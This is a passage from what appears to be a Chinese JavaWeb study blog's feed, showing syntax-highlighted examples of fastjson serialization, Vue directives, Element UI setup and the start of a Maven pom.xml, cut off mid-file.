class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSONDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//1.Java对象存入JSON对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setId(<span class="hljs-number">1</span>);<br>        user.setName(<span class="hljs-string">&quot;张三&quot;</span>);<br>        user.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>        System.out.println(s);<br><br>        <span class="hljs-comment">//2.JSON对象存入Java对象</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject1</span> <span class="hljs-operator">=</span> JSON.parseObject(s);<br>        System.out.println(jsonObject1);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject2</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;张三\&quot;,\&quot;password\&quot;:\&quot;123456\&quot;&#125;&quot;</span>);<br>        System.out.println(jsonObject2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="十二、Vue"><a href="#十二、Vue" class="headerlink" title="十二、Vue"></a>十二、Vue</h2><p>Vue 是一套前端框架，免除原生 JavaScript 中的DOM操作，简化书写</p><p>基于 MVVM（ModeI-View-ViewModel）思想，实现数据的双向绑定，将编程的关注点放在数据上</p><p>官网：<a href="https://cn.vuejs.org/">https://cn.vuejs.org</a></p><p><img src="/img/JavaWeb/1-2/Vue1.png"></p><h3 id="1、入门-1"><a href="#1、入门-1" class="headerlink" title="1、入门"></a>1、入门</h3><p><img src="/img/JavaWeb/1-2/Vue2.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!--编辑视图--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--插值表达式--&gt;</span><br>    &#123;&#123;username&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!--引入vue.js--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//1.创建Vue实例</span></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">username</span>:<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    <span class="hljs-comment">//与上面代码等价</span></span><br><span class="language-javascript">    <span class="hljs-comment">// new Vue(&#123;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//     data: function()&#123;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//         return &#123;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//            username : &quot;&quot;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//         &#125;</span></span><br><span class="language-javascript">    <span class="hljs-comment">//     &#125;</span></span><br><span class="language-javascript">    <span class="hljs-comment">// &#125;);</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、常用指令"><a href="#2、常用指令" class="headerlink" title="2、常用指令"></a>2、常用指令</h3><p><img src="/img/JavaWeb/1-2/Vue3.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-2/Vue4.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;一个按钮&quot;</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;show()&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;一个按钮&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;show()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//1. 创建Vue核心对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">username</span>:<span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;https://www.baidu.com&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;我被点了...&quot;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-2/Vue5.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;count == 3&quot;</span>&gt;</span>div1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">&quot;count == 4&quot;</span>&gt;</span>div2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>div3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;count == 3&quot;</span>&gt;</span>div v-show<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;count&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 用条件控制其div是否显示 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//1. 创建Vue核心对象</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">count</span>:<span class="hljs-number">3</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-2/Vue6.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;addr in addrs&quot;</span>&gt;</span><br>    &#123;&#123;addr&#125;&#125; <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 生成多个div盒子 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(addr,i) in addrs&quot;</span>&gt;</span><br>    &#123;&#123;i+1&#125;&#125;--&#123;&#123;addr&#125;&#125; <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//1. 创建Vue核心对象</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">addrs</span>:[<span class="hljs-string">&quot;北京&quot;</span>,<span class="hljs-string">&quot;上海&quot;</span>,<span class="hljs-string">&quot;西安&quot;</span>]</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3、生命周期"><a href="#3、生命周期" class="headerlink" title="3、生命周期"></a>3、生命周期</h3><p><img src="/img/JavaWeb/1-2/Vue7.png"></p><h2 id="十三、Element"><a href="#十三、Element" class="headerlink" title="十三、Element"></a>十三、Element</h2><p>EIement：是饿了么公司前端开发团队提供的一套基于 Vue 的网站组件库，用于快速构建网页</p><p>组件：组成网页的部件例如超链接、按钮、图片、表格等等</p><p>官网：<a href="https://element.eleme.cn/#/zh-CN">https://element.eleme.cn/#/zh-CN</a></p><h3 id="1、入门-2"><a href="#1、入门-2" class="headerlink" title="1、入门"></a>1、入门</h3><p>1.引入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;element-ui/lib/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;element-ui/lib/theme-chalk/index.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.创建Vue核心对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span></span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.官网查看相关需要的内容，应用并修改</p><p><img src="/img/JavaWeb/1-2/Element1.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础1-1</title>
    <link href="/2023/05/16/JavaWeb_1_1/"/>
    <url>/2023/05/16/JavaWeb_1_1/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础1-1"><a href="#JavaWeb基础1-1" class="headerlink" title="JavaWeb基础1-1"></a>JavaWeb基础1-1</h1><h2 id="一、Maven"><a href="#一、Maven" class="headerlink" title="一、Maven"></a>一、Maven</h2><p>常用的Maven仓库</p><p>用pom.xml文件表示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>New_Maven_1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--Tomcat--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span>8080<span class="hljs-tag">&lt;/<span class="hljs-name">port</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">path</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--servlet--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--IO流工具类--&gt;</span><br>        <span 